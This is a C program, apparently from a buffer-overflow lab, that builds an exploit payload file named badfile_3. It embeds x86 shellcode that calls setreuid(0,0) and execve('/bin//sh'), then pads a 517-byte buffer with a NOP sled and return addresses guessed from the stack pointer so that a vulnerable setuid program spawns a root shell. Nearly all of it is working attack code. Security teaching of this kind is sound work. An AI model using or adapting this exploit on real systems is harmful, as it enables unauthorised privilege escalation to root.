#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]= "\x6a\x46"			// push   $0x46
  "\x58"			// pop    %eax
  "\x31\xdb"			// xor	  %ebx, %ebx
  "\x31\xc9"			// xor	  %ecx, %ecx
  "\xcd\x80"			// int    $0x80

  "\x31\xd2"			// xor    %edx, %edx
  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80


unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_3", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
